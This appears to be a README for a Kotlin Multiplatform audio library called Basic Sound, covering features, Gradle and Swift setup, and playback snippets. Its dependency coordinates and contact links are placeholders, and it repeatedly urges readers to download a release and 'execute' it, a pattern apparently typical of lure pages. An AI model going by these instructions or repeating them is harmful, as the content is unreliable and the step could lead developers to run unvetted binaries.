# 🎶 Basic Sound 🎶

![Basic Sound](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen?style=flat-square&logo=github)

Integrate audio across all your Kotlin Multiplatform apps with a single library. Basic Sound provides a simple and effective way to handle audio in your applications, whether you are developing for Android, iOS, JavaScript, or any other Kotlin Multiplatform target.

## 🚀 Features

- **Cross-Platform Support**: Use the same audio library for Android, iOS, JVM, JavaScript, and WASM.
- **Easy Integration**: Quick setup with straightforward documentation.
- **Lightweight**: Minimal overhead to keep your apps running smoothly.
- **Flexible API**: Designed for developers, offering a clear and concise API for audio handling.

## 📦 Installation

To get started with Basic Sound, you can download the latest release from our [Releases section](https://github.com/martinafejid/basic-sound/releases). After downloading, follow the instructions in the release notes to execute and integrate it into your project.

### Gradle Setup

For Android and JVM projects, add the following to your `build.gradle` file:

```groovy
dependencies {
    implementation 'com.example:basic-sound:1.0.0'
}
```

For Kotlin Multiplatform projects, include it in your shared module:

```kotlin
kotlin {
    sourceSets {
        val commonMain by getting {
            dependencies {
                implementation("com.example:basic-sound:1.0.0")
            }
        }
    }
}
```

### Swift Package Manager

For iOS projects, you can integrate Basic Sound using Swift Package Manager:

1. Open your project in Xcode.
2. Go to `File` > `Swift Packages` > `Add Package Dependency`.
3. Enter the repository URL: `https://github.com/martinafejid/basic-sound`.

## 📖 Usage

### Initializing Basic Sound

To start using Basic Sound, you need to initialize the audio engine. This can be done in your main application file.

```kotlin
import com.example.basicsound.BasicSound

fun main() {
    val audioEngine = BasicSound()
    audioEngine.initialize()
}
```

### Playing Sounds

To play a sound, use the following code:

```kotlin
audioEngine.playSound("path/to/soundfile.mp3")
```

### Stopping Sounds

To stop a sound that is currently playing:

```kotlin
audioEngine.stopSound("path/to/soundfile.mp3")
```

### Adjusting Volume

You can adjust the volume with a simple method call:

```kotlin
audioEngine.setVolume(0.5f) // Volume ranges from 0.0 to 1.0
```

## 🌐 Supported Platforms

Basic Sound supports a wide range of platforms, ensuring you can build your applications without limitations:

- **Android**: Full support for Android devices.
- **iOS**: Seamless integration with Swift and Objective-C.
- **JavaScript**: Perfect for web applications.
- **JVM**: Works well with any Java-based applications.
- **WASM**: Compile to WebAssembly for performance in the browser.

## 🔧 Contributing

We welcome contributions to Basic Sound! If you want to help improve the library, follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch and create a pull request.

Please ensure that your code adheres to our coding standards and includes appropriate tests.

## 📝 Documentation

Comprehensive documentation is available in the [Wiki](https://github.com/martinafejid/basic-sound/wiki). You will find detailed guides, API references, and examples to help you get the most out of Basic Sound.

## 🛠️ Roadmap

Here are some upcoming features we plan to implement:

- **Advanced Audio Effects**: Add support for audio filters and effects.
- **Improved Performance**: Optimize audio playback for lower latency.
- **Expanded Platform Support**: Include more platforms based on community feedback.

## 🗣️ Community

Join our community of developers using Basic Sound. Share your projects, ask questions, and get support. You can find us on:

- **Discord**: [Join our server](https://discord.gg/example)
- **Twitter**: [Follow us](https://twitter.com/example)
- **GitHub Discussions**: Engage with other users and developers.

## 📅 Changelog

Keep track of updates and changes in the [Changelog](https://github.com/martinafejid/basic-sound/releases). We regularly update the library to fix bugs and introduce new features.

## 📧 Contact

For inquiries or support, please contact us at support@example.com.

## 🎉 Conclusion

Basic Sound is your go-to solution for audio integration across Kotlin Multiplatform apps. Download the latest release from our [Releases section](https://github.com/martinafejid/basic-sound/releases) and start building amazing audio experiences today!

![Audio Experience](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen?style=flat-square&logo=github)